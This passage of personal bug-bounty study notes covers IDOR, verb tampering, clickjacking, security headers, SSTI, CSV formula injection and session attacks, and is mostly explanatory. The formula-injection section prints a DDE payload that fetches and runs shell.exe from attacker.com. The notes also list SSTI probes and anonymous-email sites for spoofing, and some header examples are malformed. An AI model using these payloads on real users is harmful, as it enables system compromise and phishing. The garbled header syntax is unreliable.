    4.  You can identify the parameter key name by attempting to delete or edit an object within the app.

**Combine them!**

1.  IDOR vulnerabilities can have varying impacts, and sometimes they can help trigger other vulnerabilities that might otherwise be inaccessible.
    1.  For instance, if you find a minor IDOR vulnerability like editing unimportant filenames, you can increase its impact by leveraging a self-XSS bug.
    2.  Self-XSS vulnerabilities, though typically out of scope for rewards, can be combined with IDOR vulnerabilities to create a more impactful report, such as "IDOR + Stored XSS," potentially raising its severity level to P2.

**Critical IDORs**

IDOR vulnerability allows us to access an account at some time, rather than to edit or delete it. These critical bugs appear in fields such as **password reset, password change, account recovery.** So firstly, you should double check the link in your email and parameters in it. Then, you can capture the password reset request and examine the parameters with any proxy tool. We have seen many times the “user id” value in these requests and we could **takeover** to another user’s account easily.

At the same time, it’s an important thing that’s account takeover by header values sent in the request. It is seen that some header values such as “X-User-ID”, “X-UID” from the test and debug environments are changed. So that the user can act like any user and was able to account takeover successfully.

1.  IDOR vulnerabilities don't always involve editing or deleting accounts; they can also grant access to them.
    1.  These critical flaws often surface in functions like password reset, change, or account recovery.
    2.  To exploit them, check email links and their parameters carefully. Use proxy tools to capture and analyze password reset requests.
    3.  Many times, the "user id" value in these requests can be manipulated to gain access to another user's account.
    4.  Additionally, account takeover can occur via header values sent in requests, such as "X-User-ID" or "X-UID," especially in test and debug environments where these values may be altered.

**HPP Bug**

In rare cases, you can test the HPP (HTTP Parameter Pollution) vulnerability for IDOR testing by adding the same parameter one more time in your request. An example of this: <https://www.youtube.com/watch?v=kIVefiDrWUw>

**Create valid request**

You should sure that the request send to the server is correct. If you try send the a user’s request with another user, you must sure that the this request’s “CSRF-Token” value is valid. So you should put the other user’s “CSRF-Token” to in the request. Otherwise, you will get an error because of token values do not match. This can make you mislead.

Likewise, if your tested request is XHR (XML HTTP Request), you must check the validation of “Content-Type” header parameter in your request. Also, app’s requests may have custom headers like “W-User-Id”, “X-User-Id”, “User-Token” etc. If you want to do a correct and perfect test, you must send all headers that used by app is correct.

**Useful tools**

1.  Utilize Burp Suite features and plugins for IDOR vulnerability testing, such as "Authz," "AuthMatrix," and "Authorize."
    1.  The AuthZ plugin lets you view responses of requests for different users, allowing testing from one user's perspective to access another user's response.
    2.  Add custom headers like "X-CSRF-Token" for testing IDOR vulnerabilities, which can be obtained from the BApp Store.
    3.  The AuthMatrix plugin facilitates authorization checks by associating cookie or header values with specific roles in the application, available in the BApp Store.
    4.  For API requests, leverage tools like Wsdler plugin for Burp Suite, SoapUI, or Postman to efficiently test various request types (GET, POST, PUT, DELETE, PATCH) and ensure API functionality and security.

**Impact of IDOR vulnerabilities**

1.  P1 – Account takeover, Access very important data (such as credit card)
    1.  P2 – Change / delete another users’ public data, Access private / public important data (such as tickets, invoice, payment information)
    2.  P3 – Access / delete / change private data (limited personal info: name, adress etc.)
    3.  P4 – Access any unimportant data
    4.  *IDOR vulnerabilities’ impact depends on the discretion of the program manager.*

**How to prevent IDOR vulnerabilities?**

1.  **Implement proper authorization and access controls:** Ensure that user privileges are strictly enforced, allowing access only to authorized users for their respective resources. Validate user permissions at both the front-end and back-end to prevent unauthorized access to sensitive data or actions.
    1.  **Use indirect object references:** Instead of exposing direct references to sensitive objects (such as database IDs) in URLs or parameters, utilize indirect references or unique identifiers that are not easily guessable or manipulatable. This prevents attackers from directly accessing or manipulating objects by obscuring their identifiers and enforcing access through controlled, validated mechanisms.
1.  **what is different between IDOR and Directory traversal?**

IDOR will work in **variables and objects** in the application. By modifying those variables attacker can easily get the access of restricted access. We can Access any unimportant data. Also, Change / delete another users’ public data, Access private / public important data (such as tickets, invoice, payment information). Whereas directory traversal It only **traversal the files, so we can only read it. It can't execute files**. This is type of Sensitive Information Disclosure.

**Types of IDOR Attack**

Most IDOR-based attacks operate in similar ways, however, there are small differences in how the identifier is revealed and/or exploited by hackers. Below is a list of the four different types of IDOR attacks:

**URL Manipulation** URL manipulation is the most basic method of exploiting an IDOR vulnerability and typically involves little or no technical knowledge. In this kind of assault, all we have to do is alter the value of a parameter in the address bar of our web browser.

Although the HTTP request may also be modified with tools, the outcome is the same. The server gives an attacker some kind of improper access.

**Body Manipulation** Body manipulation is extremely similar to URL tampering, however, instead of altering the URL, the attacker changes one or more values in the document's body. The values of checkboxes, radio buttons, and other form elements may need to be changed to do this. Potentially, hidden form values might also be modified.

The user ID for the account that is currently logged in may be passed on by a contact in a hidden form field. We can make our request appear to come from a different user if we can change that hidden value before submitting the form.

**Cookie or JSON ID Manipulation** Cookies and JavaScript Object Notation (JSON) are both frequently used behind the scenes to store and communicate data between client and server, which aids in the dynamic nature of online sites. When we log in to a website, the server could save a user or session ID value in a cookie or JSON object. A hacker could alter these values if the application has an IDOR vulnerability.

**Path Traversal Path traversal**, often known as directory traversal, is a special kind of IDOR vulnerability that an attacker may use to access or modify files or directories directly on the server that hosts the web application. This is a more advanced form of IDOR attack than others since it gives users direct access to file system resources rather than database entries. An attacker may be able to read configuration files, get user login information, or even acquire a fully working shell on the target by using path traversal.

<https://crashtest-security.com/insecure-direct-object-reference-idor/>

1.  **HTTP web tampering? Change http method to access the sensitive information.**

HTTP Verb Tampering is an attack that exploits vulnerabilities in HTTP verb (also known as HTTP method) authentication and access control mechanisms. Many authentication mechanisms only limit access to the most common HTTP methods, thus allowing unauthorized access to restricted resources by other HTTP methods.

Many Web server authentication mechanisms use verb-based authentication and access controls. Such security mechanisms include access control rules for requests with specific HTTP methods. For example, an administrator can configure a Web server to allow unrestricted access to a Web page using HTTP GET requests, but restrict POSTs to administrators only. However, many implementations of verb-based security mechanisms enforce the security rules in an unsecure manner, allowing access to restricted resources by using alternative HTTP methods (such as HEAD) or even arbitrary character strings.

For example, Java Platform Enterprise Edition (Java EE) supports verb-based authentication and access control through the web.xml configuration file. In Java EE, one can limit access to the admin/ directories for “admin” users by adding the following to web.xml:

\<security-constraint\>

\<web-resource-collection\>

\<url-pattern\>/admin/\*\</url-pattern\>

\<http-method\>GET\</http-method\>

\<http-method\>POST\</http-method\>

\</web-resource-collection\>

\<auth-constraint\>

\<role-name\>admin\</role-name\>

\</auth-constraint\>

\</security-constraint\>

These security rules ensure that GET or POST requests to admin/ directories from non admin users will be blocked. However, HTTP requests to admin/ directories other than GET or POST will not be blocked. While a GET request from a non admin user will be blocked, a HEAD request from the same user will not. Unless the administrator explicitly configures the Web server to deny all methods other than GET and POST, the access control mechanism can be bypassed simply by using different methods that are supported by the server.

By manipulating the HTTP verb it was possible to bypass the authorization on this directory. The scanner sent a request with a custom HTTP verb (WVS in this case) and managed to bypass the authorization. The attacker can also try any of the valid HTTP verbs, such as HEAD, TRACE, TRACK, PUT, DELETE, and many more.

1.  An application is vulnerable to HTTP Verb tampering if the following conditions hold:
    1.  it uses a security control that lists HTTP verbs
    2.  the security control fails to block verbs that are not listed
    3.  it has GET functionality that is not idempotent or will execute with an arbitrary HTTP verb

For example, Apache with .htaccess is vulnerable if HTTP verbs are specified using the LIMIT keyword:

**Remediation**

In the case of Apache + .htaccess, don't use HTTP verb restrictions or use LimitExcept.

Verb tampering attacks exploit either configuration flaws in the access control mechanism or vulnerabilities in the request handlers’ code. As presented in the example above, blocking requests that use non-standard HTTP methods is not enough because in many cases an attacker can use a legitimate HTTP method like HEAD.

Imperva Secure Sphere combines two mitigation techniques to detect and stop verb tampering attacks. In the first, Secure Sphere learns which **methods are allowed for each URL**. Any attempt to use HTTP methods that are not part of the application’s normal usage will be detected and blocked.

The second technique detects non-standard HTTP methods and blocks requests using such methods. In cases where the application uses non-standard methods normally, this mechanism can be easily updated with the allowed methods.

1.  **What is Click jacking and X-Frame option enabled?**

Clickjacking is a vulnerability that occurs when an attacker uses iframe tag to create a malicious payload in a window and forces the user to trick that malicious link, such as a button or link, to another server in which they have an identical looking window. The attacker in a sense **hijacks the clicks meant for the original server and sends them to the other server**.

Here are a couple [possible known exploits](https://en.wikipedia.org/wiki/Clickjacking#Examples) or uses for clickjacking.

1.  Tricking users into making their social networking profile information public
    1.  Sharing or liking links on Facebook
    2.  Clicking Google AdSense ads to generate pay per click revenue
    3.  Making users follow someone on Twitter or Facebook
    4.  Downloading and running a malware (malicious software) allowing to a remote attacker to take control of others computers
    5.  Getting likes on Facebook fan page or +1 on Google Plus
    6.  Playing YouTube videos to gain views

Clickjacking is easy to implement, and if your site has actions that can be done with a single click, then most likely it can be clickjacked. It might not be as **common as cross site scripting or code injection attack**s, but it is still another vulnerability that exists.

**X-Frame-Options Directives: -**

1.  The x-frame-options header offers three options to choose from to control how your web pages are displayed in frames or iframes.
    1.  It's crucial to send this as an HTTP header because browsers won't pay attention to it if it's in a META tag.
    2.  Different directives may only work in specific browsers, so you need to be aware of browser support.
    3.  While it's not mandatory to use this header everywhere on your site, it's smart to enable it on pages where it's needed for security reasons.

**Mitigation:**

**1. DENY Directive**

The DENY directive completely disables the loading of the page in a frame, regardless of what site is trying. Below is what the header request will look like if this is enabled.

**x-frame-options: DENY**

This might be a great way to lock down your site, but it will also break a lot of functionality. The following two directives below are more common use cases for a typical website.

**Examples of Sites Currently Using the DENY directive** Facebook GitHub

2\. **SAMEORIGIN Directive**

The SAMEORIGIN directive allows the page to be loaded in a frame on the same origin as the page itself. Below is what the header request will look like if this is enabled.

**x-frame-options: SAMEORIGIN**

A good example of this working is the YouTube video we have above in this post. It is using the following iframe to load the video.

3\. **ALLOW-FROM UrI Directive**

The ALLOW-FROM *UrI* directive allows the page to only be loaded in a frame on the specified origin and or domain. Below is what the header request will look like if this is enabled.

**x-frame-options: ALLOW-FROM** [**https://domain.com/**](https://domain.com/)

**Hardening Your HTTP Security Headers?**

**HTTP security headers** provide yet **another layer of security best practices to implement** by helping to mitigate attacks and security vulnerabilities. Whenever a browser requests a page from a web server, the server responds with the content along with [HTTP Response Headers](https://tools.keycdn.com/curl). Some of these headers contain content meta data such as the content-encoding, [cache-control](https://www.keycdn.com/support/cache-control), status error codes, etc.

![A blue screen with a white icon and a padlock Description automatically generated](media/96398551ba9aedd1a08f1420b6ae6a4c.png)

![A screenshot of a computer Description automatically generated](media/7d20fac8f13bd07695e1235bc2588036.png)

Along with these are also HTTP security headers that tell your browser how to behave when handling your site’s content. For example, by using the strict-transport-security you can force the browser to communicate solely over HTTPS. There are six different HTTP security headers that we will explore below (in no particular order) that you should be aware of and we recommend implementing if possible.

**1. Content Security Policy:**

The content-security-policy HTTP header provides an additional layer of security. This policy helps prevent attacks such as Cross Site Scripting (XSS) and other code injection attacks by **defining content sources which are approved** and thus allowing the browser to load them.

![A screen shot of a computer Description automatically generated](media/c2a517df79d5e1403534e8c6c24523c4.png)

There are many directives which you can use with content security policy. This example below allows scripts from both the current domain (defined by ‘self’) as well as google-analytics.com.

**content-security-policy**: script-src 'self' <https://www.google-analytics.com>

**2. X-XSS-Protection**

The x-xss-protection header is designed to **enable the cross-site scripting (XSS) filter** built into modern web browsers. This is usually enabled by default, but using it will enforce it. It is supported by Internet Explorer 8+, Chrome, and Safari. Here is an example of what the header looks like.

**x-xss-protection**: 1; mode=block

**Enable in Apache**

header always set x-xss-protection "1; mode=block"

3\. **HTTP Strict Transport Security (HSTS)**

The strict-transport-security header is a security enhancement that restricts web browsers to access web servers solely over HTTPS. **This ensures the connection cannot be establish through an insecure HTTP connection** which could be susceptible to attacks.

![A close-up of a web page Description automatically generated](media/003e37da73a110ea50d19004c1f87559.png)

Here is an example of what the header looks like. You can include the max age, subdomains, and preload.

**strict-transport-security**: max-age=31536000; include Subdomains; preload

**4. X-Frame-Options**

The x-frame-options header **provides clickjacking protection** by not allowing iframe to load on your site. It is supported by IE 8+, Chrome 4.1+, Firefox 3.6.9+, Opera 10.5+, Safari 4+. Here is an example of what the header looks like.

**x-frame-options**: SAMEORIGIN

**5. Public-Key-Pins**

The public-key-pins header tells the web browser to associate a public key with a certain web server to **prevent MITM attacks using rogue and forged X.509 certificates**. This protects users in case a certificate authority is compromised. Here is an example of what the header looks like.

**public-key-pins**: pin-sha256="t/OMbKSZLWdYUDmhOyUzS+ptUbrdVgb6Tv2R+EMLxJM="; pin-sha256="PvQGL6PvKOp6Nk3Y9B7npcpeL4

6\. X-Content-Type-Options[\#](https://www.keycdn.com/blog/http-security-headers#6-x-content-type-options)

The x-content-type header prevents Internet Explorer and Google Chrome from sniffing a response away from the declared content-type. This helps reduce the danger of drive-by downloads and helps treat the content the right way. Here is an example of what the header looks like.

x-content-type: no sniff

1.  **What is content security policy attack?**
1.  Content Security Policy (CSP) is a security standard to stop XSS, clickjacking, and other code injection attacks on trusted web pages.
    1.  CSP is implemented by adding the Content-Security-Policy HTTP header to a web page, specifying which resources the user's browser can load.
    2.  A well-designed CSP defends against cross-site scripting attacks, enhancing web page security.

**Recommendation: -**

To enable CSP, you need to configure your web server to return the [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP header (sometimes you will see mentions of the X-Content-Security-Policy header, but that's an older version and you don't need to specify it anymore).

Alternatively, the [\<meta\>](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta) element can be used to configure a policy, for example: \<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src [https://\*](https://*); child-src 'none';"\>

**Mitigating cross site scripting attack: -**

1.  CSP aims to prevent and report XSS attacks, exploiting the browser's trust in content from the server.
    1.  It enables server admins to limit XSS vectors by specifying trusted domains for script sources.
    2.  CSP-compatible browsers execute scripts only from whitelisted domains, ignoring others, including inline scripts and event-handling HTML attributes.
    3.  For maximum protection, sites can choose to globally prohibit script execution.

**Mitigating packet sniffing attack: -**

1.  Servers can control which domains and protocols are allowed for content loading, enhancing security.
    1.  It's ideal to enforce HTTPS for all data transfers, marking cookies with the secure flag, and redirecting HTTP pages to HTTPS.
    2.  The Strict-Transport-Security HTTP header ensures browsers only connect over encrypted channels, further securing data transmission.

**What is CSP? explain each CSP mitigation headers in summary**

CSP mitigations are implemented through HTTP headers that instruct the browser on how to enforce the security policy. The following are some of the CSP mitigation headers:

1.  **default-src**: This header specifies the default policy for all resources, including images, scripts, and stylesheets. It restricts the sources that can be used to load content on the page.
    1.  **script-src**: This header restricts the sources from which JavaScript code can be loaded and executed.
    2.  **style-src**: This header restricts the sources from which CSS stylesheets can be loaded.
    3.  **img-src**: This header restricts the sources from which images can be loaded.
    4.  **connect-src**: This header restricts the sources from which XMLHttpRequests (XHR) and WebSocket connections can be made.
    5.  **font-src**: This header restricts the sources from which fonts can be loaded.
    6.  **object-src**: This header restricts the sources from which plugins (such as Flash) and other embedded objects can be loaded.
    7.  **frame-src**: This header restricts the sources from which frames and iframe can be loaded.
    8.  **media-src**: This header restricts the sources from which media (such as audio and video) can be loaded.
    9.  **report-UrI**: This header specifies the URL where the browser sends reports when a CSP violation occurs.

By implementing these CSP mitigation headers, a website can restrict the types of content that can be loaded on the page and prevent unauthorized code execution. CSP is an effective security measure that helps protect against a variety of web-based attacks, including cross-site scripting, clickjacking, and code injection attacks.

**SPF Records:** SPF (Sender Policy Framework) uses a DNS entry to specify a list of servers that are allowed to send email for a specific domain.

It is recommended to set the SPF along with SPF, we recommend setting up Domain keys identified Mail (DKIM) and Domain-based Message Authentication, Reporting & Conformance (DMARC):

• **SPF** specifies which domains can send messages.

• **DKIMM** verifies that message content is authentic and not changed.

• **DMARC** specifies how your domain handles suspicious incoming emails.

Also, recommended to set the SPF record to hard fail(-all) for the production applications.

![A screenshot of a computer Description automatically generated](media/ea17a68b599d5b6a9d61290dc9cf358b.png)

**10 Missing insufficient SPF record**

regarding the dns records vulnerability

SPF(sender policy framework) if it is not there sender sends the phishing mails.so this domain is vulnerable for phishing attacks.

tool: <https://mxtoolbox.com/>

<https://www.kitterman.com/spf/validate.html>

exploitation sends mails

<https://emkei.cz/>

<https://anonymousemail.me/>

<http://www.sendanonymousemail.net/>

<https://www.5ymail.com/>

///////////////////////////////////////////////////////////////////////////////

Subdomain Takeover

![A diagram of a computer program Description automatically generated](media/a6143df2937cc36b2e85cef4e26b560f.png)

The vulnerability here is that the target subdomain points to a domain that does not exist. An attacker can then register the non-existing domain. Now the target subdomain will point to a domain the attacker controls

**how to perform Subdomain Takeover vulnerability**

Subdomain takeover is a type of vulnerability that occurs when a subdomain of a website is pointing to a service or resource that no longer exists, but the DNS record is still active. An attacker can take advantage of this situation by registering the expired service or resource and taking control of the subdomain. To perform subdomain takeover testing, you can follow these steps:

**Identify target subdomains:** Use tools such as Sublist3r, Amass, or Subfinder to identify subdomains associated with the target website.

**Check DNS records:** Check the DNS records of each subdomain to identify any expired services or resources.

**Verify subdomain ownership:** Verify that you own the expired service or resource associated with the subdomain by registering it or creating a CNAME record that points to your server.

**Test for subdomain takeover:** Attempt to access the subdomain and see if you can control its content. You can try uploading a file, modifying the page content, or redirecting the subdomain to a malicious website.

**Report and remediate:** If you are able to take over the subdomain, report the vulnerability to the appropriate parties and provide guidance on how to remediate the issue. This may involve updating DNS records, removing the CNAME record, or deleting the subdomain altogether.

[Subdomain Takeover Bug Bounty-Ultimate Guide To Subdomain Takeover \|\| Bug Bounty](https://www.youtube.com/watch?v=gDzZH7u5V3c)

![A screenshot of a computer Description automatically generated](media/12d1fcd247b542d529f8e53887abfde7.png)

![A screenshot of a computer program Description automatically generated](media/1f06e9e3dda7db2b6ab70b53da378954.png)

**What is server side template injection SSTI attack** <https://www.youtube.com/watch?v=Ffeco5KB73I>

Template injection is a type of web vulnerability that occurs when an attacker is able to inject malicious code into a web application's template engine, causing the engine to execute the code and when user input is not properly validated or sanitized, allowing an attacker to inject code into a template file, which is then executed on the server-side.

They are often used in conjunction with other types of attacks, such as Cross-Site Scripting (XSS) or SQL Injection, to escalate the level of access that an attacker has on a system.

Template engines are commonly used in web applications to generate dynamic content, such as HTML pages or email templates. They allow developers to separate presentation logic from business logic, making it easier to develop and maintain web applications. However, if a template engine is not properly secured, an attacker may be able to inject malicious code into the template, allowing them to execute arbitrary code on the server.

**Some common techniques used in template injection attacks include:**

1.  Using template tags to execute code: Template tags such as **{{}} or \<% %\>** may be used to execute arbitrary code if they are not properly sanitized.
    1.  Injecting variables into the template: An attacker may try to inject variables into the template, which could be used to access sensitive information or take control of the application.
    2.  Escaping template delimiters: If an attacker is able to escape the delimiters used by the template engine, they may be able to inject malicious code.
    3.  Exploiting template inheritance: If the application uses template inheritance, an attacker may be able to inject malicious code into a parent template that is inherited by multiple child templates.

To prevent template injection attacks, it is important to ensure that all input is properly sanitized before it is passed to the template engine. This can be done by using input validation and sanitization techniques such as input filtering and output encoding. Additionally, developers should use a template engine that has built-in security features to prevent template injection attacks, such as automatic escaping of template variables.

Payload: \${6\*6}, \${{3\*3}}, @(6+5), \#{3\*3}, \#{ 3 \* 3 }

![A diagram of a computer Description automatically generated](media/aede34f1a058dce44af0a7536e4020d5.png)

![A screenshot of a computer Description automatically generated](media/3a1e3813339f796194794e92c745ae3b.png)

**what is Formula injection vulnerability** [Formula Injection/CSV injection \|\| POC Video \|\| Bug Bounty \|\| Mission1920](https://www.youtube.com/watch?v=1YjoyHl3Ico)

![A syringe injecting a computer screen Description automatically generated](media/62590047ea93028a3ccfcbab41072239.png)

Formula injection vulnerabilities commonly occur in applications that utilize spreadsheet functionality or mathematical calculations. They typically arise when user input is not properly validated, sanitized, or restricted before being used in formulas or expressions.

Attackers can exploit formula injection vulnerabilities by injecting malicious formulas or expressions into user input fields, which are then executed by the application's processing engine.

A Formula Injection (or Spreadsheet Formula Injection) vulnerability affects **applications that export spreadsheet files** which are dynamically constructed from inadequately validated input data. Once injected, it affects application end-users that access the **application exported spreadsheet file**s. Successful exploitation can lead to impacts such as client-sided command injection, code execution or remote ex-filtration of contained confidential data.

When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with '=' will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:

1.  Hijacking the user's computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524
    1.  Hijacking the user's computer by exploiting the user's tendency to ignore security warnings in spreadsheets that they downloaded from their own website
    2.  Exfiltrating contents from the spreadsheet, or other open spreadsheets.

This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, ensure that no cells begin with any of the following characters:

1.  Equals to ("=")
    1.  Plus ("+")
    2.  Minus ("-")
    3.  At ("@")

Below are some of the functions which can be used by attacker to inject malicious payloads.

**Example 1: Hyperlink function in excel**

Hyperlink creates a shortcut or jump that opens a document stored on a network server, an intranet, or the Internet. When you click the cell that contains the HYPERLINK function, Microsoft Excel opens the file that is stored at link location.

**Syntax:** HYPERLINK(link_location, [friendly_name])

**Example 2: Command Execution**

Excel provide us with the functionality DDE (Dynamic Data Exchange), where we can execute application commands on the Excel window.

To open the notepad application on excel one would use the following:

**Syntax:** =cmd\|’ /C notepad’!’A1′

Let us assume an attack scenario of Student Record Management system of a school. The application allows teacher to enter details of students in the school. The attacker get access to the application and want that all the teacher using the application to get compromised. So the attacker tries to perform CSV injection attack through the web application.

The attacker need to steal other student’s details. So the attacker uses the Hyperlink formula ad enter it while entering student details.

When the teacher export the CSV and click on the hyperlink then the sensitive data is sent to the attacker’s server.

So we can take this attack further more. We can install shell in the system using below payload:

**=cmd\|’ /C powershell Invoke-WebRequest “**[**http://www.attacker.com/shell.exe**](http://www.attacker.com/shell.exe)**” -OutFile “\$env:Temp\\shell.exe”; Start-Process “\$env:Temp\\shell.exe”‘!A1**

Using this shell we can perform many further attacks.

So now the attacker enters the malicious payload into the server which is saved in the database.

**=cmd\|’/C ping -t 192.168.2.107 -l 25152′!’A1′**

When the victim export the csv the payload is exported in the csv file and when victim opens the CSV file using MS excel below error is shown to the victim.

So the victim has downloaded the csv file from trusted resource so they click on “Yes”.Now the MS Excel runs the payload and start sending ping request to the target server.

**what is diff between RCE and RFI in summary**

RCE (Remote Code Execution) and RFI (Remote File Inclusion) are both vulnerabilities that allow an attacker to execute arbitrary code on a remote system. However, they differ in their method of exploitation:

1.  RCE is a vulnerability that allows an attacker to **execute** code on a target system by exploiting a flaw in an application or system that processes untrusted input. This type of vulnerability is often the result of poor input validation or inadequate access control mechanisms. Once an attacker successfully exploits an RCE vulnerability, they can take control of the system and execute any code they want.
    1.  RFI, on the other hand, is a vulnerability that allows an attacker to **include remote files** on a target system by exploiting a flaw in an application or system that processes untrusted input. This type of vulnerability is often the result of inadequate input validation or inadequate access control mechanisms. Once an attacker successfully exploits an RFI vulnerability, they can execute code from a remote location on the target system.

In summary, RCE allows an attacker to execute arbitrary code on a remote system, while RFI allows an attacker to include remote files on a target system. Both vulnerabilities are serious and can lead to complete compromise of a system if left unpatched or unmitigated.

**how to steal/compromise the session excluding XSS vuln. explain any other scenario in summary**

There are several other scenarios that can be used to steal or compromise a session, even if there are no XSS vulnerabilities present:

1.  **Session fixation:** An attacker can fix the session ID to a known value, then trick the user into using that session ID by sending them a link with the session ID included. Once the user logs in using the fixed session ID, the attacker can use the same ID to access the user's account.
    1.  **Session hijacking:** An attacker can intercept the session ID that the user sends to the server during a session, then use that ID to impersonate the user and gain access to their account.
    2.  **Cross-site request forgery (CSRF):** An attacker can trick the user into performing an action on the target website, such as clicking a button or submitting a form, that sends a request to the server with the user's session ID included. If the user is already logged in to the website, the request will be processed using their session, and the attacker can use that session to perform unauthorized actions on the user's behalf.
    3.  MIMT Attacks
    4.  Session token in url

To prevent session compromise in these scenarios, websites should use secure session management practices, such as generating new session IDs for each session, using HTTPS to encrypt session data, and implementing CSRF protection mechanisms. Users can also protect their sessions by logging out of websites when they are finished using them, not sharing session IDs or login credentials with others, and using two-factor authentication where possible.

**How many methods to bypass the session hijacking and how it possible via XSS attack in summary**

Session hijacking can be a serious security issue for web applications, as it allows an attacker to take control of a user's session and potentially gain unauthorized access to their account. There are several methods to bypass session hijacking protections, including:

1.  **Session fixation**: An attacker can fix the session ID to a known value, then trick the user into using that session ID by sending them a link with the session ID included. This can bypass protections that generate new session IDs for each session.
    1.  **Man-in-the-middle (MITM) attacks**: An attacker can intercept the user's session ID during a session and use it to impersonate the user, potentially bypassing protections such as HTTPS encryption.
    2.  **Cross-site scripting (XSS):** An attacker can use an XSS vulnerability to inject malicious code into a web page, which can then steal the user's session ID and send it to the attacker's server.

In the case of an XSS attack, the attacker can use JavaScript code to steal the user's session ID by accessing it through the DOM (Document Object Model) of the web page. Once the attacker has the session ID, they can use it to hijack the user's session and gain unauthorized access to their account. To prevent XSS attacks and session hijacking, websites should implement proper input validation, sanitization, and output encoding to prevent malicious code injection, as well as using secure session management practices and HTTPS encryption.

File upload vulnerability

[File Upload Test Cases](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Web%20App%20Bugs.one#File%20Upload%20Test%20Cases&section-id={41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F}&page-id={0132CED6-AB02-42A3-94E7-7A71A491A36C}&end) ([Web view](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Web%20App%20Bugs.one%7C41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F%2FFile%20Upload%20Test%20Cases%7C0132CED6-AB02-42A3-94E7-7A71A491A36C%2F%29))

[Rate Limitation Vulnerability](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Web%20App%20Bugs.one#Rate%20Limitation%20Vulnerability&section-id={41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F}&page-id={A8AF4D65-DEEE-4904-A532-56741FCA7EEA}&end) ([Web view](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Web%20App%20Bugs.one%7C41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F%2FRate%20Limitation%20Vulnerability%7CA8AF4D65-DEEE-4904-A532-56741FCA7EEA%2F%29))

[Open Redirection](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Web%20App%20Bugs.one#Open%20Redirection&section-id={41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F}&page-id={F354EF31-572F-452C-9FD4-25AE94AE3EA0}&end) ([Web view](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Web%20App%20Bugs.one%7C41F5CE7E-0477-4DC0-8D60-8E5FEA1AE31F%2FOpen%20Redirection%7CF354EF31-572F-452C-9FD4-25AE94AE3EA0%2F%29))

**Web Application client side & server-Side Attacks complete list?**

**Client-Side Attacks:**

1.  Cross-Site Scripting (XSS)
    1.  Cross-Site Request Forgery (CSRF)
    2.  Clickjacking
    3.  DOM-based Attacks
    4.  Browser History Manipulation
    5.  UI Redressing Attacks
    6.  Cross-Origin Resource Sharing (CORS) Attacks
    7.  HTML Injection
    8.  JavaScript Code Injection
    9.  Session Hijacking
    10. Man-in-the-Browser (MitB) Attacks
    11. Malicious Browser Extensions
    12. Drive-by Downloads
    13. HTML5 Security Issues (e.g., Local Storage Abuse, Web Messaging Abuse)
    14. Vulnerable and Outdated Components
    15. Sensitive Data Leakage
    16. Broken Client-side Access Control

**Server-Side Attacks:**

1.  SQL Injection (SQLi)
    1.  Remote Code Execution (RCE)
    2.  Server-Side Request Forgery (SSRF)
    3.  File Inclusion Attacks
    4.  Command Injection
    5.  XML External Entity (XXE) Attacks
    6.  Server-Side Template Injection (SSTI)
    7.  Server Misconfiguration and Information Leakage
    8.  Insecure Direct Object References (IDOR)
    9.  Session Management Vulnerabilities
    10. LDAP Injection
    11. Path Traversal
    12. Insecure Deserialization
    13. Business Logic Flaws
    14. Authentication Bypass
    15. Data Leakage and Exposure
    16. Mass Assignment Vulnerabilities
    17. Remote File Upload Vulnerabilities

It's important to note that this list covers common attacks, but new vulnerabilities and attack techniques can emerge over time. Implementing secure coding practices, conducting regular security assessments, and staying updated with the latest security best practices are essential for m aintaining the security of web applications.

**what is the Client-Side Injection and Server-Side Injection complete list**

Certainly! Here's a complete list of client-side and server-side injection attacks:

Client-Side Injection Attacks:

1.  Cross-Site Scripting (XSS)
    1.  HTML Injection
    2.  CSS Injection
    3.  DOM (Document Object Model) Injection
    4.  Template Injection

Server-Side Injection Attacks:

1.  SQL Injection (SQLi)
    1.  OS Command Injection
    2.  LDAP Injection
    3.  XPath Injection
    4.  XML External Entity (XXE) Injection
    5.  Remote Code Execution (RCE)
    6.  Expression Language Injection (EL Injection)
    7.  Remote File Inclusion (RFI)
    8.  Server-Side Request Forgery (SSRF)
    9.  Host Header Injection
    10. Server-Side SQL Injection in stored procedures or database queries
    11. Server-Side XML Injection
    12. Server-Side JSON Injection

It's important to note that these attacks can have severe consequences, such as unauthorized data access, data manipulation, or even complete server compromise. Implementing proper input validation, using parameterized queries or prepared statements, and employing security measures like input/output encoding, secure configuration, and strong access controls can help mitigate these risks. Regular security testing and staying updated with the latest security practices are also crucial to prevent injection attacks.

**Tell me cookie attribute and tell me each one of these**

When it comes to web cookies, there are several attributes that can be set to control their behavior. Here are the common attributes associated with cookies:

**Name:** The name of the cookie, which is used to identify it.

Value: The value associated with the cookie, which can be a string or any other data.

**Domain:** Specifies the domain(s) within which the cookie is valid. The browser only sends the cookie to the specified domain and its subdomains.

**Path:** Determines the path on the server to which the cookie will be sent. The browser only includes the cookie in requests that match the specified path.

**Expires:** Sets an expiration date for the cookie. Once the expiration date is reached, the browser will no longer send the cookie to the server.

**Max-Age:** Specifies the maximum age of the cookie in seconds. After the specified duration, the cookie will be considered expired.

**Secure:** When set to true, the cookie is only transmitted over secure (HTTPS) connections. It helps prevent the cookie from being intercepted over unencrypted connections.

**HttpOnly:** When set to true, the cookie is not accessible to client-side scripting languages (e.g., JavaScript). This attribute helps mitigate cross-site scripting (XSS) attacks by preventing the theft of sensitive cookie information.

